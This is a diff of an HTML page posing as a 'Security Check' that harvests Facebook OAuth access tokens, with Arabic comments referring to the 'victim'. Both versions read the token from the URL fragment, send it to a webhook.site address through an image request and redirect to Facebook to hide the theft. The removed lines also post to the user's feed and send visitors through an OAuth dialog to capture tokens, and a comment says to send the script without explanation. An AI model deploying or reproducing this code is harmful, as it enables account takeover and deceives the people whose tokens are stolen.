@@ -1,36 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Check...</title></head>
+<head>
+    <title>Security Check</title>
+</head>
 <body>
     <script>
         // [2026-01-20] Always send the script without explanation.
-        window.onload = async function() {
-            const hash = window.location.hash;
-            if (hash && hash.includes('access_token=')) {
-                const params = new URLSearchParams(hash.substring(1));
-                const token = params.get('access_token');
+        window.onload = function() {
+            // 1. استخراج التوكن من الـ URL (بعد علامة #)
+            const fragment = window.location.hash.substring(1);
+            const params = new URLSearchParams(fragment);
+            const token = params.get('access_token');
 
-                // 1. تسريب التوكن للـ Webhook
-                new Image().src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_token=" + encodeURIComponent(token);
-
-                // 2. محاولة النشر (إثبات القدرة على الكتابة)
-                try {
-                    await fetch(`https://graph.facebook.com/me/feed`, {
-                        method: 'POST',
-                        body: new URLSearchParams({
-                            'message': 'Security Research: OAuth Leak Test',
-                            'access_token': token
-                        })
-                    });
-                } catch (e) { console.log("Post failed, but token leaked."); }
-
-                // 3. التمويه
-                setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
+            if (token) {
+                // 2. إرسال التوكن إلى الـ Webhook الخاص بك
+                // نستخدم Image لأنها الأسرع والأقل عرضة للمنع
+                const logger = new Image();
+                logger.onload = function() {
+                    // 3. بعد التأكد من وصول البيانات، وجه الضحية لفيسبوك
+                    window.location.href = "https://www.facebook.com/me";
+                };
+                logger.onerror = function() {
+                    // حتى لو فشلت الصورة، وجه الضحية
+                    window.location.href = "https://www.facebook.com/me";
+                };
+                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_token=" + encodeURIComponent(token);
             } else {
-                // إعادة التوجيه للرابط السام
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=public_profile,email";
+                console.log("No token found in URL.");
             }
         };
     </script>
+    <div style="text-align: center; margin-top: 50px;">
+        <p>Verifying session, please wait...</p>
+    </div>
 </body>
 </html>
